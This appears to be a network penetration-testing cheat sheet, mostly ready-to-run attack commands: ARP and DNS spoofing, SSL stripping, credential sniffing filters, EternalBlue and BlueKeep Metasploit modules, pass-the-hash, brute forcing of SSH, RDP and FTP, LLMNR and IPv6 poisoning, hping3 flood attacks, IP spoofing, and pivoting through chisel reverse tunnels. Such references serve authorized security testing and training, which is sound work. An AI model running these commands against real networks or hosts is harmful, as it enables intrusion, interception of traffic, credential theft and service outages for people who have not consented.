# Network Penetration Testing

## Overview

Network penetration testing involves identifying and exploiting vulnerabilities in network infrastructure, protocols, and services.

---

## Network Scanning & Enumeration

### Host Discovery
```bash
# Ping sweep
nmap -sn 192.168.1.0/24
fping -a -g 192.168.1.0/24

# ARP scan (local network)
arp-scan -l
netdiscover -r 192.168.1.0/24

# TCP SYN ping
nmap -sn -PS 192.168.1.0/24
```

### Port Scanning
```bash
# Full TCP scan
nmap -p- -T4 target.com

# UDP scan
nmap -sU -top-ports 100 target.com

# Service version detection
nmap -sV -sC target.com

# OS detection
nmap -O target.com

# Aggressive scan
nmap -A -T4 target.com

# Firewall/IDS evasion
nmap -f target.com              # Fragment packets
nmap -D RND:10 target.com       # Decoy scan
nmap --source-port 53 target.com # Source port manipulation
nmap -sI zombie.com target.com   # Idle scan
```

---

## Man-in-the-Middle (MITM) Attacks

### ARP Spoofing
```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoofing with arpspoof
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.10

# Ettercap
ettercap -T -M arp:remote /192.168.1.10/ /192.168.1.1/
ettercap -G  # GUI mode

# Bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets 192.168.1.10
> arp.spoof on
> net.sniff on
```

### DNS Spoofing
```bash
# Ettercap DNS spoofing
# Edit /etc/ettercap/etter.dns
target.com A 192.168.1.100

# Run ettercap with DNS spoofing
ettercap -T -M arp:remote /192.168.1.10// -P dns_spoof

# Bettercap DNS spoofing
> set dns.spoof.domains target.com
> set dns.spoof.address 192.168.1.100
> dns.spoof on
```

### SSL Stripping
```bash
# sslstrip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
sslstrip -l 8080

# Bettercap with SSL stripping
> set http.proxy.sslstrip true
> http.proxy on
```

---

## Network Sniffing

### Packet Capture
```bash
# tcpdump
tcpdump -i eth0 -w capture.pcap
tcpdump -i eth0 host 192.168.1.10
tcpdump -i eth0 port 80
tcpdump -i eth0 'tcp[13] & 2 != 0'  # SYN packets

# Wireshark
wireshark -i eth0

# tshark (CLI Wireshark)
tshark -i eth0 -w capture.pcap
tshark -r capture.pcap -Y "http.request"
```

### Credential Harvesting
```bash
# Ettercap filters
# Search for credentials in traffic
ettercap -T -M arp:remote /target/ -F filter.ef

# Wireshark filters for credentials
http.request.method == "POST"
ftp.request.command == "PASS"
pop.request.command == "PASS"
smtp.req.parameter
```

### Network Protocol Analysis
```bash
# Analyze HTTP traffic
wireshark display filter: http

# Analyze FTP traffic
wireshark display filter: ftp

# Analyze SMTP traffic
wireshark display filter: smtp

# Analyze DNS traffic
wireshark display filter: dns
```

---

## SMB/NetBIOS Enumeration & Attacks

### SMB Enumeration
```bash
# List shares
smbclient -L //target -N
smbmap -H target
crackmapexec smb target --shares

# Enumerate users
enum4linux -a target
crackmapexec smb target -u '' -p '' --users

# Null session
rpcclient -U "" target
smbclient //target/share -N

# Get domain info
crackmapexec smb target --pass-pol
```

### SMB Attacks
```bash
# EternalBlue (MS17-010)
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
run

# SMBGhost (CVE-2020-0796)
use exploit/windows/smb/cve_2020_0796_smbghost

# SMB relay attack
ntlmrelayx.py -t target -smb2support

# Pass-the-Hash
pth-winexe -U 'DOMAIN/user%hash' //target cmd.exe
```

---

## Network Service Attacks

### FTP Attacks
```bash
# Anonymous FTP login
ftp target
Username: anonymous
Password: anonymous@

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://target
medusa -h target -U users.txt -P passwords.txt -M ftp

# FTP bounce attack
nmap -b ftp-server:21 target -p 22,80,443
```

### SSH Attacks
```bash
# SSH brute force
hydra -l root -P passwords.txt ssh://target
medusa -h target -u root -P passwords.txt -M ssh

# SSH user enumeration (CVE-2018-15473)
python3 ssh_enum_users.py --userList users.txt target

# Weak SSH keys
ssh-audit target
```

### SNMP Enumeration
```bash
# SNMP scan
onesixtyone -c community.txt target
snmpwalk -v2c -c public target

# SNMP enumeration
snmp-check target
nmap -sU -p 161 --script snmp-brute target

# Common community strings
public
private
manager
```

### RDP Attacks
```bash
# RDP brute force
hydra -l administrator -P passwords.txt rdp://target
crowbar -b rdp -s target/32 -u admin -C passwords.txt

# BlueKeep (CVE-2019-0708)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# RDP session hijacking
tscon <session_id> /dest:<destination_session>
```

### Database Attacks
```bash
# MySQL enumeration and attacks
nmap -p 3306 --script mysql-enum target
mysql -h target -u root -p

# MSSQL attacks
nmap -p 1433 --script ms-sql-info target
sqsh -S target -U sa

# PostgreSQL
psql -h target -U postgres

# MongoDB
mongo target:27017
```

---

## IPv6 Attacks

```bash
# IPv6 neighbor discovery
ping6 ff02::1%eth0

# THC-IPv6 toolkit
# Router advertisement flooding
flood_router6 eth0

# Fake router advertisement
fake_router6 eth0 <IPv6-prefix>

# IPv6 MITM
parasite6 eth0
```

---

## VLAN Attacks

### VLAN Hopping
```bash
# Switch spoofing
yersinia -G  # GUI mode
# Select DTP and launch attack

# Double tagging
# Craft packet with two 802.1Q tags

# Frogger (VLAN hopping tool)
./frogger.sh
```

---

## VoIP Attacks

```bash
# SIP enumeration
svmap 192.168.1.0/24
svwar -m INVITE -e100-200 target

# VoIP sniffing
# Use Wireshark with SIP/RTP filters

# VoIP fuzzing
voiper
```

---

## Routing Protocol Attacks

### BGP Attacks
```bash
# BGP hijacking (requires privileged position)
# Route injection
# Route leaks
```

### OSPF Attacks
```bash
# OSPF hello flooding
# LSA injection
```

---

## Denial of Service (DoS) Testing

**Note: Only in authorized lab environments**

```bash
# SYN flood
hping3 -S --flood -V -p 80 target

# UDP flood
hping3 --udp --flood -V target

# ICMP flood
hping3 --icmp --flood target

# Slowloris (HTTP DoS)
slowloris -s 200 target

# Application-level DoS testing
# Use authorized DoS tools in controlled environments
```

---

## Firewall & IDS Evasion

### Packet Fragmentation
```bash
nmap -f target
nmap -mtu 8 target
```

### Timing and Performance
```bash
nmap -T0 target  # Paranoid
nmap -T1 target  # Sneaky
nmap -T2 target  # Polite
```

### Source Port Manipulation
```bash
nmap --source-port 53 target
nmap --source-port 80 target
```

### IP Spoofing
```bash
nmap -S spoofed_ip target
hping3 -a spoofed_ip target
```

### Proxy Chains
```bash
# Configure proxychains
vim /etc/proxychains.conf

# Use proxychains
proxychains nmap target
proxychains curl http://target
```

---

## Wireless Network Attacks

See `05-wireless/` directory for detailed wireless attack techniques.

---

## Network Attack Tools

### Metasploit Framework
```bash
msfconsole
search <vulnerability>
use <exploit>
set RHOSTS <target>
set PAYLOAD <payload>
exploit
```

### Nmap NSE Scripts
```bash
# List all scripts
ls /usr/share/nmap/scripts/

# Run specific category
nmap --script=vuln target
nmap --script=exploit target
nmap --script=brute target

# Custom script usage
nmap --script=<script-name> target
```

### Network Exploitation
```bash
# Responder (LLMNR/NBT-NS poisoning)
responder -I eth0 -wrf

# Mitm6 (IPv6 MITM)
mitm6 -d domain.local

# CrackMapExec
crackmapexec smb 192.168.1.0/24
crackmapexec smb target -u user -p password
```

---

## Post-Exploitation Networking

```bash
# Port forwarding
ssh -L local_port:target:target_port user@pivot
ssh -R remote_port:target:target_port user@pivot
ssh -D 1080 user@pivot  # SOCKS proxy

# Network pivoting
# Use Metasploit autoroute
meterpreter> run autoroute -s 10.10.10.0/24

# Chisel (HTTP tunnel)
./chisel server -p 8080 --reverse
./chisel client server:8080 R:1080:socks

# sshuttle
sshuttle -r user@pivot 10.10.10.0/24
```

---

## Network Security Assessment Methodology

1. **Network Discovery**
   - Host enumeration
   - Service discovery
   - Topology mapping

2. **Service Enumeration**
   - Version detection
   - Banner grabbing
   - Configuration analysis

3. **Vulnerability Assessment**
   - Known vulnerabilities
   - Misconfigurations
   - Weak credentials

4. **Exploitation**
   - Exploit vulnerable services
   - Gain initial access
   - Maintain persistence

5. **Post-Exploitation**
   - Privilege escalation
   - Lateral movement
   - Data exfiltration

6. **Reporting**
   - Document findings
   - Proof of concepts
   - Remediation recommendations

---

## Further Reading

- Network Security Assessment (O'Reilly)
- NIST SP 800-115
- PTES Technical Guidelines
- Red Team Field Manual
